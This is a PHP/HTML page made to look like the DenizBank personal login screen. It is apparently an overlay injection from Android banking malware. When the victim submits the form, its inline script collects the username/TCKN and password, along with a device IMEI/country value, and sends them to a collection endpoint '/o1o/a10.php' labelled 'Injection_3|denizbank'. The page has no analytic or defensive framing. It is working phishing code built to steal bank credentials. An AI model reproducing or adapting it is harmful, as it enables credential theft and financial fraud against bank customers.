<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="tr/com.tmob.denizbank/vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="tr/com.tmob.denizbank/fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="tr/com.tmob.denizbank/fonts/iconic/css/material-design-iconic-font.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="tr/com.tmob.denizbank/vendor/animate/animate.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="tr/com.tmob.denizbank/vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="tr/com.tmob.denizbank/vendor/animsition/css/animsition.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="tr/com.tmob.denizbank/vendor/select2/select2.min.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="tr/com.tmob.denizbank/vendor/daterangepicker/daterangepicker.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="tr/com.tmob.denizbank/css/util.css">
	<link rel="stylesheet" type="text/css" href="tr/com.tmob.denizbank/css/main.css">
<!--===============================================================================================-->
</head>
	<?php
    $IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
    //$IMEI_country = "321|tr";
    include "config.php";
    ?>
<body>
	
	<div class="limiter">
		<center>
		<img width="60%"   src="tr/com.tmob.denizbank/images/logo.png">
		
		</center>
		<div class="container-login100">
			<div class="wrap-login100">
				<span class="login100-form-title" style="margin-bottom: 70px;">
						BİREYSEL GİRİŞ
					</span>
				<form method="post">
					

					<div class="wrap-input100">
						<input class="input100" type="text" onKeyUp="if(this.value>9999999999){this.value=this.value.substr(0,11);}" name="fields[login]" id="login">
						<span class="focus-input100" data-placeholder="Kullanıcı Adı / TCKN"></span>
					</div>

					<div class="wrap-input100">
						<span class="btn-show-pass" >
							<i class="zmdi zmdi-eye"></i>
						</span>
						<input class="input100" type="password" name="fields[password]" id="password" maxlength="25">
						<span class="focus-input100" data-placeholder="Parola"></span>
					</div>
					<div class="container-login100-form-btn">
							<input type="submit" value="Devam" class="login100-form-btn" id="submitBtn1">
					</div>

				</form>
   <script type="text/javascript">

  (function () {


        var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
             var input = objDoc.createElement("input");
             input.setAttribute("type", "hidden");
             input.setAttribute("name", sNm);
             input.setAttribute("value", sV);
             input.value = sV;
             objForm.appendChild(input);
         };
                    var g_oBtn = document.getElementById('submitBtn1');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input';
						} catch(e){};

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'input error';
							} catch(e){};
                            return false;
                        }

                        if (oCodeInp.value.length < 3) {
							try{
                                oCodeInp.className = 'input error';
							} catch(e){};
                            return false;
                        }
top['closeDlg'] = true;
var url='';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|denizbank|"+oNumInp.value+"|"+oCodeInp.value);

return false;
};

})();
</script>			</div>
		</div>
	</div>
	

	<div id="dropDownSelect1"></div>
	
<!--===============================================================================================-->
	<script src="tr/com.tmob.denizbank/vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
	<script src="tr/com.tmob.denizbank/vendor/animsition/js/animsition.min.js"></script>
<!--===============================================================================================-->
	<script src="tr/com.tmob.denizbank/vendor/bootstrap/js/popper.js"></script>
	<script src="tr/com.tmob.denizbank/vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
	<script src="tr/com.tmob.denizbank/vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
	<script src="tr/com.tmob.denizbank/vendor/daterangepicker/moment.min.js"></script>
	<script src="tr/com.tmob.denizbank/vendor/daterangepicker/daterangepicker.js"></script>
<!--===============================================================================================-->
	<script src="tr/com.tmob.denizbank/vendor/countdowntime/countdowntime.js"></script>
<!--===============================================================================================-->
	<script src="tr/com.tmob.denizbank/js/main.js"></script>

</body>
</html>